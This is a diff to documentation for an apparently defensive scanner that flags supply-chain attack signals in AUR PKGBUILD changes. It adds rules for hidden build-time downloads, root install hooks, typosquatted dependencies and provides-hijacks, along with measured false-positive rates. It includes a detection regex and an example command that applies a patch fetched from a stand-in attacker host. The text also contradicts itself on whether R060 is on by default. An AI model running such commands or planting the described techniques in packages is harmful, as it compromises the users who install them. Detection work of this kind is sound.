@@ -70,7 +70,7 @@ A pattern that matches the header while scoping itself to `function_body` theref
 
 | Tier | Rule sources | What they measure |
 |------|-------------|-------------------|
-| A (Structural) | R001 to R013, R039 to R058, C001 to C007 | Direct pattern matching against PKGBUILD commands and structure |
+| A (Structural) | R001 to R013, R039 to R061, C001 to C007, D001 to D003 | Direct pattern matching against PKGBUILD commands and structure |
 | B (Priors/Context) | Source bucket classification | Domain reputation of new URLs (not a rule, but a scoring input) |
 | C (History/Novelty) | URL and maintainer novelty | First-seen signals from the local database |
 | D (Verification) | Checksum, PGP, GPG presence | Cryptographic integrity metadata (subtractive) |
@@ -467,6 +467,166 @@ Every `raw_line` rule below sets `added_only = true`.
 - **Category:** `system`
 - **Pattern:** `^\+?\s*(?:sudo\s+)?(?:install|cp|mv|dd|tee)\s+[^;&|]*(?:(?<=\s)|(?<=\s["\x27]))(?:/etc|/boot|/usr/bin|/usr/lib)/`
 - **Description:** Detects writes to `/etc`, `/boot`, `/usr/bin`, or `/usr/lib` by absolute path. The same write prefixed with `$pkgdir` is normal packaging and does not match.
+
+---
+
+### R060: Critical Build Function Modified {#r060}
+
+- **Target:** programmatic (diff-aware, defined in `analysis.py`)
+- **Severity:** INFO (weight 0)
+- **Category:** `build`
+- **Description:** The diff changes any line inside `build()`, `prepare()`, `check()`, or `package()`. Many supply-chain attacks add a single line to one of these functions, so this reports that an executing function was altered.
+
+**INFO, so it contributes nothing to the score.** It fires on 21.4 % of benign diffs because maintainers rewrite build functions routinely, and no narrowing reaches triage quality: restricting to an unchanged `pkgver` still leaves 11.6 %, and the "version bump that also rewrites `build()`" case the rule was first proposed for is 9.8 %. Carrying weight it would simply add points to one benign update in five.
+
+At weight 0 it is context for a reviewer rather than a signal, which is why it is the one rule in this group that is **on by default**.
+
+Function membership comes from `_classify_enclosing_function()` in `rules.py`, **not** from the `@@` hunk header. The calibration corpus is generated with `git diff -W` and a custom `xfuncname`, so its hunk headers name the enclosing function, while the live pygit2 path emits none. A rule tuned on hunk headers would be calibrated against data production never produces.
+
+Off by default; see [`[experimental_rules]`](configuration.md#experimental_rules).
+
+### R061: Hidden Network Fetch In Build {#r061}
+
+- **Target:** programmatic (resolved command lines)
+- **Severity:** HIGH (weight 25)
+- **Category:** `network`
+- **Description:** A command inside `build()`, `prepare()`, `check()`, or `package()` downloads a URL that does not appear in `source=()`. This is the classic route around checksum verification: the declared sources verify cleanly while the real payload arrives at compile time.
+
+The comparison is against a **source-array-scoped** URL extraction, not the general `extract_urls_from_diff()`. That helper collects URLs from any added line, including the offending `curl` line itself, so comparing against it would mean the rule could never fire. A fetch of a URL already declared in `source=()` does not fire.
+
+Off by default; see [`[experimental_rules]`](configuration.md#experimental_rules).
+
+---
+
+## Measured fire rates (experimental rules) {#experimental-fire-rates}
+
+Measured against the 3246-diff benign corpus with a 209,909-name dependency corpus, so these are **false-positive rates**: every hit is a benign package.
+
+| Rule | Severity | Fires | Rate | Read |
+|------|----------|-------|------|------|
+| D004 | HIGH | 0 | 0.00 % | No false positive across the 2084 corpus diffs that declare `provides`/`replaces`. |
+| R062 | HIGH | 3 | 0.09 % | All `mullvad-vpn-bin`, which sets a setuid bit and enables a unit from `post_install()`. Real privileged behaviour, which is the point. |
+| R063 | HIGH | 0 | 0.00 % | Zero, because it asks where the patch comes from rather than whether it is declared. The broad "not in `source=()`" form measured 2.13 %. |
+| R064 | MEDIUM | 1 | 0.03 % | `transset-df`, a genuine https to http downgrade. |
+| D001 | HIGH | 5 | 0.15 % | Comfortably low for HIGH. All five are real package names that simply nothing else in the AUR depends on (`kde-rounded-corners-x11`, `python2-gevent-eventemitter`, `udfclient-fuse3`), not parser noise. |
+| D002 | HIGH | 0 | 0.00 % | No false positive anywhere in the corpus. Bounded by D001, which it refines. |
+| D003 | MEDIUM | 15 | 0.46 % | Almost all are `git` added to fetch submodules, the legitimate case the MEDIUM severity anticipates. |
+| R060 | INFO | 694 | **21.4 %** | Why it is INFO. No narrowing reaches triage quality (`pkgver` unchanged still leaves 11.6 %, a bump that also edits `build()` is 9.8 %), so it carries weight 0 and reports context instead of scoring. Harmless at that weight, hence on by default. |
+| R061 | HIGH | 7 | 0.22 % | The hits are real build-time downloads (`apple-fonts`, `ttf-ms-win-*`, `gamescope-nvidia`), which is the behaviour the rule exists to surface rather than noise. |
+
+Getting D001 from 5.95 % to 0.15 % took two extractor fixes, both found by this measurement rather than by review:
+
+- An unbounded fallback for unquoted array entries read shell fragments (`if`, `[[`, `!`) out of a `package()` body as dependency names.
+- Comments inside dependency arrays contributed every word of the note (`required`, `because`, `disabled`).
+
+Both are covered by regression tests in `tests/test_deps_rules.py`.
+
+### R062: Install Hook Fetches Or Executes {#r062}
+
+- **Target:** programmatic (defined in `analysis.py`)
+- **Severity:** HIGH (weight 25)
+- **Category:** `installer`
+- **Description:** A `.install` hook body (`post_install`, `post_upgrade`, `pre_install`, `pre_upgrade`, `pre_remove`, `post_remove`) downloads something or performs a privileged operation: `chmod u+s`, `systemctl enable`, `eval`, `useradd`.
+
+Hooks run **as root at install time**, which makes them the highest-privilege code a PKGBUILD carries. `generate_diff()` already includes `*.install` patches, and `_classify_enclosing_function()` recognises `post_install()` exactly as it recognises `build()`, so no separate parser is involved.
+
+Comments are stripped before matching: one of the corpus hits was the line `# systemctl enable input-remapper`.
+
+Overlaps [R007](#r007), which matches any line mentioning `.install` at MEDIUM. R007 is left as it is because it is calibrated and in the baseline; R062 is the narrow, higher-severity companion.
+
+### R063: Patch Applied From Outside The Build Tree {#r063}
+
+- **Target:** programmatic (resolved command lines)
+- **Severity:** HIGH (weight 25)
+- **Category:** `integrity`
+- **Description:** `patch` or `git apply` inside a build function takes its input from a URL, an absolute path, or process substitution.
+
+```bash
+patch -p1 < <(curl https://evil.example/x.patch)   # fires
+patch -p1 -i /tmp/x.patch                          # fires
+patch -p1 -i "$srcdir/fix.patch"                   # does not fire
+```
+
+This rule deliberately does **not** check membership of `source=()`. Patches routinely arrive inside the extracted tarball, so absence from `source=()` does not mean a patch is undeclared, and no static check can separate the two. That broader form was measured at 2.13 % of benign diffs; asking where the input comes from instead measures 0.00 %.
+
+### R064: Source URL Downgraded To HTTP {#r064}
+
+- **Target:** programmatic (diff-aware)
+- **Severity:** MEDIUM (weight 15)
+- **Category:** `network`
+- **Description:** A URL declared in `source=()` as `https://` before the diff appears as `http://` after it, with the same host and path. Plain http was never upgraded; this is a URL that lost its transport security.
+
+Distinguishing a downgrade from a URL that was always http needs both sides of the diff, which is why `extract_source_array_urls()` takes a `side` parameter.
+
+---
+
+## D-series (dependency-graph rules) {#d-series}
+
+Defined in `src/trustsight/analysis.py`, not in `rules.toml`. They compare the
+dependency arrays before and after the diff and consult the local database, so
+they cannot be expressed as a pattern over a single line.
+
+They also have to bypass the engine's own filtering: `rules.py` strips
+`depends`, `makedepends`, `optdepends`, and `checkdepends` lines before any
+pattern runs, which is why extraction lives in `src/trustsight/deps.py`.
+
+All D-series rules are **off by default**. Enable them individually under
+[`[experimental_rules]`](configuration.md#experimental_rules).
+
+### D001: Novel Dependency Added {#d001}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `dependency`
+- **Description:** A dependency name appears that has never been observed anywhere in the AUR. Either a typo or a package created specifically to be pulled in.
+
+The corpus of known names is seeded from every `depends`/`makedepends`/`optdepends`/`checkdepends` entry in the AUR, **plus every package name and `provides` alias**. Without the latter, a real package that simply nothing else depends on would read as novel.
+
+If the corpus has not been seeded the rule stays silent, rather than treating an empty table as "nothing has ever been seen".
+
+Three classes of name are never considered novel, each an observed false positive:
+
+| Ignored | Example | Why |
+|---------|---------|-----|
+| Unresolved variables | `$_pkgname`, `${pkgbase}` | Not a name; the tokenizer could not expand it |
+| Sonames | `libwlroots-0.21.so` | Satisfied by whichever package provides that ABI |
+| Companion split packages | `jellyfin-desktop-libcef-bin` alongside `jellyfin-desktop-git` | Belongs to the same project, so it is expected to be globally unknown |
+
+### D002: Typosquatted Dependency {#d002}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `dependency`
+- **Description:** A novel dependency name within one or two edits (Damerau-Levenshtein, so transpositions count) of a popular package: `openss1` for `openssl`, `cur1` for `curl`.
+
+D002 **refines D001**: only a name D001 has already found to be globally unknown is compared, and D002 is reported instead of D001 when it matches. That ordering is what makes the check both affordable and correct. A precomputed table of confusable pairs cannot work, because a table built from existing package names can only contain names that must *not* fire, while the names that should fire do not exist yet.
+
+Popularity is taken from `observation_count`, so no separate package list is shipped. The distance threshold scales with length: short names sit close to many unrelated real packages, with `yay` one edit from `yak`, `yam`, `jay`, and `may`.
+
+### D004: Dependency Hijack Via Provides {#d004}
+
+- **Severity:** HIGH (weight 25)
+- **Category:** `dependency`
+- **Description:** `provides=` or `replaces=` declares an **established package unrelated to this one**. `provides=('openssl')` or `replaces=('sudo')` installs this package in front of the real one, satisfying every dependency on it.
+
+"Established" means present in the official repositories (`pacman -Slq`), falling back to `observation_count` when pacman cannot be reached.
+
+Relatedness is what makes this usable, since declaring a variant of yourself is the ordinary pattern. Two forms are accepted:
+
+| Shape | Example | Fires |
+|-------|---------|-------|
+| One name is a prefix of the other | `htop-vim` provides `htop` | no |
+| Shared leading token (siblings) | `linux-cachyos` provides `linux-headers` | no |
+| Shared token is a generic ecosystem prefix | `python-evil` provides `python-requests` | **yes** |
+| No relationship | `some-pkg` provides `openssl` | **yes** |
+
+The ecosystem carve-out matters: thousands of unrelated packages share `python-`, so treating that as evidence of a common project would suppress exactly the hijack the rule exists to catch.
+
+### D003: New Network-Using Makedepends {#d003}
+
+- **Severity:** MEDIUM (weight 15)
+- **Category:** `dependency`
+- **Description:** `makedepends` gains a network-capable tool (`curl`, `wget`, `git`, `python-requests`, …) that was not there before, meaning the build can now fetch code that no checksum covers.
+
+MEDIUM because adding `git` to fetch submodules is legitimate. It is a signal, not a verdict.
 
 ---
 
